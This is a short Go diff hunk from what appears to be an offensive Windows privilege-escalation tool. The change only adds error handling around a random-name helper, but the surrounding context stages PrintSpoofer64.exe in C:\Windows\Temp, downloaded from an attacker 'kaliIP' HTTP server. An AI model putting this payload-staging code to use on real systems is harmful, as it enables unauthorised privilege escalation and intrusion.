@@ -804,7 +804,12 @@ func runSweetPotatoProbe(ctx context.Context, host core.Host,
 	defer stopCmd(srv)
 	time.Sleep(500 * time.Millisecond)
 
-	remoteName := tools.RandString(6) + ".exe"
+	remoteName, err := tools.RandString(6)
+	if err != nil {
+		fmt.Printf("[-] PrintSpoofer: randstring failed: %v\n", err)
+		return
+	}
+	remoteName += ".exe"
 	remotePath := `C:\Windows\Temp\` + remoteName
 	url := fmt.Sprintf("http://%s:%s/PrintSpoofer64.exe", kaliIP, port)
 
